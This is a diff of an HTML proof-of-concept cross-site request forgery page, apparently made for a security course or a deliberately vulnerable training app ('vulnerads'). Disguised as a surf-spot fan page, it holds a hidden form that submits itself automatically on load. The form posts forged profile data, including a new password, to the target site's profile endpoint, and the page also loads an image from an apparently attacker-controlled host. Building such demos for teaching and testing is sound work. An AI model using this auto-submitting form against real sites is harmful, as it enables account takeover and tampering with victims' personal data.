@@ -1,21 +1,27 @@
+<!DOCTYPE html>
 <html>
+<head>
+	<meta charset="utf-8"/>
+</head>
 <body>
 	<iframe style="display:none" name="csrf-frame"></iframe>
-	<form id="command" method='POST' accept-charset="ISO-8859-1" action='http://localhost:8080/profile' target="csrf-frame">
-        <input type="hidden"id="username" name="username" placeholder="Benutzername" class="form-control" type="text" value="g"/>
-        <input type="hidden"id="firstname" name="firstname" placeholder="Vorname" class="form-control" type="text" value="Gustav"/>
-        <input type="hidden"id="lastname" name="lastname" placeholder="Nachname" class="form-control" type="text" value="Gans"/>
-        <input type="hidden"id="creditcardnumber" name="creditcardnumber" placeholder="Kreditkartennummer" class="form-control" type="text" value=""/>
-        <input type="hidden"id="phonenumber" name="phonenumber" placeholder="Telefonnummer" class="form-control" type="text" value="+49 (451) 20955152"/>
-        <input type="hidden"id="zip" name="zip" placeholder="PLZ" class="form-control" type="text" value="23568"/>
-        <input type="hidden"id="town" name="town" placeholder="Ort" class="form-control" type="text" value="L&uuml;beck"/>
-        <input type="hidden"id="password" name="password" placeholder="Passwort" class="form-control" type="password" value="8666"/>
-        <input type="hidden"id="password2" name="password2" placeholder="Passwort wiederholen" class="form-control" type="password" value="8666"/>
-        <input type="hidden" name="submit-btn" type="submit" value="Speichern"/>
-        <input id="userid" name="userid" type="hidden" value="2"/>
+	<form id="profile" method='POST' accept-charset="utf-8" action='https://vulnerads.de/profile' target="csrf-frame">
+        <input type="hidden" id="username" name="username" placeholder="Benutzername" class="form-control" value="g" />
+        <input type="hidden" id="firstname" name="firstname" placeholder="Vorname" class="form-control" value="Gustav" />
+        <input type="hidden" id="lastname" name="lastname" placeholder="Nachname" class="form-control" value="Gans" />
+        <input type="hidden" id="creditcardnumber" name="creditcardnumber" placeholder="Kreditkartennummer" class="form-control" value="" />
+        <input type="hidden" id="phonenumber" name="phonenumber" placeholder="Telefonnummer" class="form-control" value="+49 (451) 20955152" />
+        <input type="hidden" id="zip" name="zip" placeholder="PLZ" class="form-control" value="23568" />
+        <input type="hidden" id="town" name="town" placeholder="Ort" class="form-control" value="L&uuml;beck" />
+        <input type="hidden" id="password" name="password" placeholder="Passwort" class="form-control" value="8666" />
+        <input type="hidden" id="password2" name="password2" placeholder="Passwort wiederholen" class="form-control" value="8666" />
+        <input id="userid" name="userid" type="hidden" value="2" />
 	</form>
-	<script>document.getElementById("command").submit();</script>
+	<script>document.getElementById("profile").submit();</script>
 	<h1>Surfer's Paradise</h1>
 	<p> Your #1 resource for all the best spots in the world...</p>
+	<img src="https://attacat.de:8666/surfer/surfers.jpg" />
+	<p style="font-size: 6px">This image was originally posted to Flickr by Chill Mimi at https://flickr.com/photos/78541979@N05/17117890906. It was reviewed on 21 July 2015 by FlickreviewR and was confirmed to be licensed under the terms of the cc-by-2.0.</p>
+	
 </body>
 </html>
